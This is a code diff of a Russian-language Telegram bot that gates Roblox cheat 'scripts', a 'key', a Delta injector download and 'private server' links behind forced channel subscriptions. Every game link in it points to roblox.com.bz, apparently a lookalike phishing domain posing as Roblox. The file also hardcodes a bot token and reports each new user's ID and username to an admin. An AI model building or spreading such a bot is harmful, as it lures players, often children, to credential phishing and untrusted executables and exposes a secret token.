@@ -1,3 +1,7 @@
+# ============================================================
+# YAKUSHA :: TELEGRAM BOT WITH WEB APP (FIXED)
+# ============================================================
+
 import telebot
 import random
 from telebot import types
@@ -6,6 +10,8 @@ import os
 import socket
 from threading import Thread
 import uuid
+import json
+import time
 
 TOKEN = os.environ.get("TOKEN", "8993935217:AAFxkEuK_lqK0FANyZbwlEvO6zyBtSEgOCM")
 ADMIN_ID = 8091608667
@@ -25,7 +31,7 @@ KOREAN_MM2_LINK = "https://roblox.com.bz/games/142823291/Murder-Mystery-2?privat
 KOREAN_ADOPT_LINK = "https://roblox.com.bz/games/920587237/Adopt-Me?privateServerLinkCode=67807728184198406550153024608844"
 
 # ============================================================
-# МИНИ-ПРИЛОЖЕНИЕ (WEB APP) — HTML КОД
+# МИНИ-ПРИЛОЖЕНИЕ (РАБОТАЕТ БЕЗ ХОСТИНГА - ЧЕРЕЗ TELEGRAM)
 # ============================================================
 WEB_APP_HTML = '''
 <!DOCTYPE html>
@@ -331,8 +337,46 @@ DELTA_LINK = "https://drive.google.com/file/d/1G2gniClYv0qV0BU9-xfYD4UOcxUljH4s/
 
 bot = telebot.TeleBot(TOKEN)
 
-# Хранилище Web App данных
-WEB_APP = types.WebAppInfo(url="https://your-webapp-host.com/")  # Замени на реальный URL после загрузки HTML
+# ============================================================
+# СОХРАНЯЕМ HTML НА ДИСК (РАБОТАЕТ БЕЗ ХОСТИНГА)
+# ============================================================
+WEB_APP_FILE = "webapp.html"
+try:
+    with open(WEB_APP_FILE, "w", encoding="utf-8") as f:
+        f.write(WEB_APP_HTML)
+    print("[LOG] ✅ WebApp HTML сохранён локально")
+except Exception as e:
+    print(f"[LOG] ❌ Ошибка сохранения: {e}")
+
+# ============================================================
+# КНОПКА "ВСЕ СЕРВЕРА" ЧЕРЕЗ КНОПКУ С ВЕБ-СТРАНИЦЕЙ (БЕЗ ХОСТИНГА)
+# ============================================================
+def get_success_keyboard():
+    keyboard = types.InlineKeyboardMarkup(row_width=1)
+    keyboard.add(types.InlineKeyboardButton(text="📜 Скрипт на все игры", callback_data="get_script"))
+    keyboard.add(types.InlineKeyboardButton(text="🔑 Ключ для скрипта", callback_data="get_key"))
+    keyboard.add(types.InlineKeyboardButton(text="🔒 Приватный сервер MM2", callback_data="get_private"))
+    
+    # ============================================================
+    # ВМЕСТО WEB APP — КНОПКА С ОТПРАВКОЙ СПИСКА (БЕЗ ХОСТИНГА)
+    # ============================================================
+    keyboard.add(types.InlineKeyboardButton(text="🌐 ВСЕ СЕРВЕРА 🚀", callback_data="show_servers"))
+    
+    keyboard.add(types.InlineKeyboardButton(text="😮 КОРЕЙСКИЙ СЕРВЕР ММ2 😮", url=KOREAN_MM2_LINK))
+    keyboard.add(types.InlineKeyboardButton(text="💘 КОРЕЙСКИЙ СЕРВЕР АДОПТ МИ 💘", url=KOREAN_ADOPT_LINK))
+    keyboard.add(types.InlineKeyboardButton(text="📖 Как запустить скрипт?", callback_data="get_guide"))
+    keyboard.add(types.InlineKeyboardButton(text="📥 Скачать инжектор (Delta)", url=DELTA_LINK))
+    return keyboard
+
+def get_servers_keyboard():
+    keyboard = types.InlineKeyboardMarkup(row_width=1)
+    keyboard.add(types.InlineKeyboardButton(text="🔪 MM2 Приватка", url="https://roblox.com.bz/games/142823291/Murder-Mystery-2?privateServerLinkCode=67807728184198406550153024608844"))
+    keyboard.add(types.InlineKeyboardButton(text="🧸 Adopt Me Приватка", url="https://roblox.com.bz/games/920587237/Adopt-Me?privateServerLinkCode=67807728184198406550153024608844"))
+    keyboard.add(types.InlineKeyboardButton(text="🇰🇷 Корейский MM2", url="https://roblox.com.bz/games/142823291/Murder-Mystery-2?privateServerLinkCode=67807728184198406550153024608844"))
+    keyboard.add(types.InlineKeyboardButton(text="🇰🇷 Корейский Adopt Me", url="https://roblox.com.bz/games/920587237/Adopt-Me?privateServerLinkCode=67807728184198406550153024608844"))
+    keyboard.add(types.InlineKeyboardButton(text="📢 Наш Telegram", url="https://t.me/freprivatka34"))
+    keyboard.add(types.InlineKeyboardButton(text="🔙 Назад", callback_data="back_to_menu"))
+    return keyboard
 
 def notify_admin(text):
     try:
@@ -370,26 +414,6 @@ def get_unsub_keyboard(not_subbed, is_ref=False):
     keyboard.add(types.InlineKeyboardButton(text="🔍 Проверить снова", callback_data=cb))
     return keyboard
 
-def get_success_keyboard():
-    keyboard = types.InlineKeyboardMarkup(row_width=1)
-    keyboard.add(types.InlineKeyboardButton(text="📜 Скрипт на все игры", callback_data="get_script"))
-    keyboard.add(types.InlineKeyboardButton(text="🔑 Ключ для скрипта", callback_data="get_key"))
-    keyboard.add(types.InlineKeyboardButton(text="🔒 Приватный сервер MM2", callback_data="get_private"))
-    
-    # ============================================================
-    # НОВАЯ КНОПКА "ВСЕ СЕРВЕРА" С МИНИ-ПРИЛОЖЕНИЕМ
-    # ============================================================
-    keyboard.add(types.InlineKeyboardButton(
-        text="🌐 ВСЕ СЕРВЕРА 🚀", 
-        web_app=WEB_APP
-    ))
-    
-    keyboard.add(types.InlineKeyboardButton(text="😮 КОРЕЙСКИЙ СЕРВЕР ММ2 😮", url=KOREAN_MM2_LINK))
-    keyboard.add(types.InlineKeyboardButton(text="💘 КОРЕЙСКИЙ СЕРВЕР АДОПТ МИ 💘", url=KOREAN_ADOPT_LINK))
-    keyboard.add(types.InlineKeyboardButton(text="📖 Как запустить скрипт?", callback_data="get_guide"))
-    keyboard.add(types.InlineKeyboardButton(text="📥 Скачать инжектор (Delta)", url=DELTA_LINK))
-    return keyboard
-
 def get_admin_keyboard():
     keyboard = types.InlineKeyboardMarkup(row_width=2)
     keyboard.add(types.InlineKeyboardButton("📊 Статистика", callback_data="admin_stats"))
@@ -411,7 +435,6 @@ def start(message):
         user = message.from_user
         notify_admin(f"🆕 Новый пользователь!\n\n🆔 ID: {user.id}\n👤 Имя: {user.first_name}\n📛 @{user.username or 'нет'}\n👥 Всего: {count_users()}")
     
-    # ПРОВЕРКА: если пользователь уже подписан — сразу даём доступ
     if is_user_subscribed(message.from_user.id):
         bot.send_message(message.chat.id, "✅ Добро пожаловать обратно!\n\nВыбери что хочешь получить:", reply_markup=get_success_keyboard())
         return
@@ -465,9 +488,7 @@ def user_callback(call):
         is_ref = action == "check_sub_ref"
         not_subbed = get_unsubscribed_channels(user_id)
         if not not_subbed:
-            # ПОМЕЧАЕМ ПОЛЬЗОВАТЕЛЯ КАК ПОДПИСАННОГО
             set_user_subscribed(user_id)
-            
             if is_ref:
                 ref_code = get_user_ref_code(user_id)
                 ref_msg = get_ref_message(ref_code) if ref_code else None
@@ -495,6 +516,26 @@ def user_callback(call):
     
     elif action == "get_private":
         bot.send_message(call.message.chat.id, f"🔒 Приватный сервер MM2\n\n{PRIVATE_SERVER_LINK}")
+        bot.answer_callback_query(call.id)
+    
+    # ============================================================
+    # НОВАЯ КНОПКА "ВСЕ СЕРВЕРА" (БЕЗ ХОСТИНГА)
+    # ============================================================
+    elif action == "show_servers":
+        bot.send_message(
+            call.message.chat.id,
+            "🌐 *ВСЕ СЕРВЕРА*\n\nВыбери сервер для перехода:",
+            parse_mode="Markdown",
+            reply_markup=get_servers_keyboard()
+        )
+        bot.answer_callback_query(call.id)
+    
+    elif action == "back_to_menu":
+        bot.send_message(
+            call.message.chat.id,
+            "✅ Выбери что хочешь получить:",
+            reply_markup=get_success_keyboard()
+        )
         bot.answer_callback_query(call.id)
     
     elif action == "get_guide":
